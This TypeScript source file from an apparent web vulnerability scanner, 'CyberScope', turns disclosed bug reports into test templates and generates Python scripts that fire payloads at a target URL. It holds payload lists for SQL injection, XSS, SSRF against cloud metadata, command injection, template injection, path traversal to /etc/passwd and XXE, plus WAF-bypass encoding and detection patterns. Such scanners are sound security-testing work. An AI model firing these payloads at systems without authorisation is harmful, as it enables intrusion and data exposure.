/**
 * TemplateGen.ts — Adaptive Template Synthesizer
 * Converts extracted intelligence into machine-executable
 * CyberScope Test Templates that can be tested against any target URL.
 */

export interface TestTemplate {
  id: string;
  name: string;
  vulnClass: string;
  owaspCategory: string;
  description: string;
  payloads: TemplatePayload[];
  detectionLogic: DetectionRule[];
  applicableTechStack: string[];
  wafBypassStrategies: string[];
  generalized: boolean;
  sourceReportId: string;
  confidence: number;
}

export interface TemplatePayload {
  value: string;
  encoding: "raw" | "url" | "double-url" | "base64" | "unicode";
  paramType: "query" | "body" | "header" | "path" | "cookie";
  httpMethod: "GET" | "POST" | "PUT" | "DELETE" | "PATCH";
}

export interface DetectionRule {
  type: "body_contains" | "body_regex" | "status_diff" | "length_diff" | "timing_diff" | "header_check";
  pattern: string;
  threshold?: number;
  description: string;
}

/**
 * Generate a generalized test template from parsed intelligence.
 */
export function synthesizeTemplate(params: {
  reportId: string;
  title: string;
  vulnClass: string;
  payloads: string[];
  techStack: string[];
  bypassTechniques: string[];
  wafBypassLogic: string | null;
  severity: string;
  owaspCategory: string;
}): TestTemplate {
  const templatePayloads = generatePayloads(params.vulnClass, params.payloads, params.bypassTechniques);
  const detectionRules = generateDetectionRules(params.vulnClass);

  return {
    id: crypto.randomUUID(),
    name: `Intel: ${params.title.slice(0, 60)}`,
    vulnClass: params.vulnClass,
    owaspCategory: params.owaspCategory,
    description: `Auto-generated from disclosed report ${params.reportId}. Tests for ${params.vulnClass} with ${templatePayloads.length} payloads and ${params.bypassTechniques.length} bypass strategies.`,
    payloads: templatePayloads,
    detectionLogic: detectionRules,
    applicableTechStack: params.techStack,
    wafBypassStrategies: params.bypassTechniques,
    generalized: true,
    sourceReportId: params.reportId,
    confidence: params.payloads.length > 0 ? 80 : 50,
  };
}

/**
 * Generate a Python script from the template for execution.
 */
export function templateToScript(template: TestTemplate): string {
  const payloadList = template.payloads.map((p) => `    "${p.value.replace(/"/g, '\\"')}"`).join(",\n");
  const detectionChecks = template.detectionLogic
    .map((r) => {
      if (r.type === "body_contains") return `    if "${r.pattern}" in response.text: hits.append("${r.description}")`;
      if (r.type === "body_regex") return `    if re.search(r"${r.pattern}", response.text): hits.append("${r.description}")`;
      if (r.type === "status_diff") return `    if response.status_code != baseline_status: hits.append("${r.description}")`;
      if (r.type === "length_diff") return `    if abs(len(response.text) - baseline_len) > ${r.threshold || 50}: hits.append("${r.description}")`;
      return "";
    })
    .filter(Boolean)
    .join("\n");

  return `#!/usr/bin/env python3
"""CyberScope Intel Template: ${template.name}
Vuln Class: ${template.vulnClass} | OWASP: ${template.owaspCategory}
Auto-generated from report: ${template.sourceReportId}
"""
import requests, re, sys, time

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "{{TARGET_URL}}"

payloads = [
${payloadList}
]

print(f"[*] Testing {TARGET_URL} for ${template.vulnClass}")
print(f"[*] ${template.payloads.length} payloads, ${template.detectionLogic.length} detection rules")

# Get baseline
try:
    baseline = requests.get(TARGET_URL, timeout=15)
    baseline_status = baseline.status_code
    baseline_len = len(baseline.text)
except Exception as e:
    print(f"[!] Baseline failed: {e}")
    sys.exit(1)

confirmed = []
for i, payload in enumerate(payloads):
    try:
        time.sleep(0.3)
        response = requests.get(TARGET_URL, params={"test": payload}, timeout=15)
        hits = []
${detectionChecks}
        if hits:
            confirmed.append({"payload": payload, "evidence": hits})
            print(f"  [+] HIT ({len(hits)} signals): {payload[:60]}")
        else:
            print(f"  [-] Miss: {payload[:40]}")
    except Exception as e:
        print(f"  [!] Error: {e}")

print(f"\\n[*] Results: {len(confirmed)}/{len(payloads)} payloads triggered detection")
if confirmed:
    print("[CONFIRMED] Vulnerability evidence found")
    for c in confirmed:
        print(f"  Payload: {c['payload'][:80]}")
        print(f"  Evidence: {', '.join(c['evidence'])}")
else:
    print("[CLEAN] No vulnerability evidence detected")
`;
}

// ─── Internal generators ───

function generatePayloads(
  vulnClass: string,
  reportPayloads: string[],
  bypasses: string[]
): TemplatePayload[] {
  const payloads: TemplatePayload[] = [];

  // Include payloads from the report
  for (const p of reportPayloads.slice(0, 5)) {
    payloads.push({ value: p, encoding: "raw", paramType: "query", httpMethod: "GET" });
  }

  // Add generalized payloads per vuln class
  const classPayloads: Record<string, string[]> = {
    sqli: [
      "' AND '1'='1", "' AND '1'='2", "' OR 1=1--", "1' UNION SELECT NULL--",
      "' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
    ],
    rxss: [
      "<cyberscope>", '"><svg onload=alert(1)>', "'-alert(1)-'",
      "<img src=x onerror=console.log('cs')>", "javascript:alert(1)//",
    ],
    ssrf: [
      "http://127.0.0.1:80", "http://[::1]", "http://169.254.169.254/latest/meta-data/",
      "http://0x7f000001/", "http://localhost:8080/admin",
    ],
    cmdi: [
      "; echo cyberscope", "| echo cyberscope", "`echo cyberscope`",
      "$(echo cyberscope)", "; id",
    ],
    ssti: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}"],
    "path-traversal": [
      "....//....//etc/passwd", "..%2f..%2f..%2fetc/passwd",
      "..\\..\\..\\etc\\passwd", "%252e%252e%252fetc/passwd",
    ],
    idor: ["1", "0", "999999", "admin", "../../admin"],
    xxe: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "cyberscope">]><foo>&xxe;</foo>'],
  };

  const defaults = classPayloads[vulnClass] || classPayloads.sqli;
  for (const p of defaults) {
    if (!payloads.some((existing) => existing.value === p)) {
      payloads.push({ value: p, encoding: "raw", paramType: "query", httpMethod: "GET" });
    }
  }

  // Apply bypass mutations
  if (bypasses.includes("double encoding") || bypasses.includes("encoding bypass")) {
    const encoded = payloads.slice(0, 3).map((p) => ({
      ...p,
      value: p.value.replace(/[<>"']/g, (c) => `%25${c.charCodeAt(0).toString(16)}`),
      encoding: "double-url" as const,
    }));
    payloads.push(...encoded);
  }

  return payloads;
}

function generateDetectionRules(vulnClass: string): DetectionRule[] {
  const rules: Record<string, DetectionRule[]> = {
    sqli: [
      { type: "body_regex", pattern: "sql syntax|SQLSTATE|pg_query|ORA-\\d+|mysql_fetch", description: "SQL error string detected" },
      { type: "length_diff", pattern: "", threshold: 100, description: "Significant body length differential" },
      { type: "timing_diff", pattern: "", threshold: 4000, description: "Time-based delay detected" },
    ],
    rxss: [
      { type: "body_contains", pattern: "<cyberscope>", description: "XSS probe reflected unescaped" },
      { type: "body_regex", pattern: "onerror=|onload=|alert\\(", description: "Event handler reflected" },
    ],
    ssrf: [
      { type: "body_contains", pattern: "ami-id", description: "AWS metadata leaked" },
      { type: "body_contains", pattern: "169.254.169.254", description: "Internal IP in response" },
      { type: "status_diff", pattern: "", description: "Status code changed with SSRF payload" },
    ],
    cmdi: [
      { type: "body_contains", pattern: "cyberscope", description: "Command output marker found" },
      { type: "body_regex", pattern: "uid=\\d+\\(|root:.*:0:0", description: "System command output detected" },
    ],
    ssti: [
      { type: "body_contains", pattern: "49", description: "Template evaluated 7*7=49" },
      { type: "body_regex", pattern: "\\bconfig\\b|SECRET_KEY", description: "Template config leaked" },
    ],
    "path-traversal": [
      { type: "body_regex", pattern: "root:.*:0:0|\\[boot loader\\]", description: "System file content detected" },
    ],
    idor: [
      { type: "length_diff", pattern: "", threshold: 50, description: "Different content for different IDs" },
    ],
    xxe: [
      { type: "body_contains", pattern: "cyberscope", description: "XXE entity expanded" },
    ],
  };

  return rules[vulnClass] || rules.sqli;
}
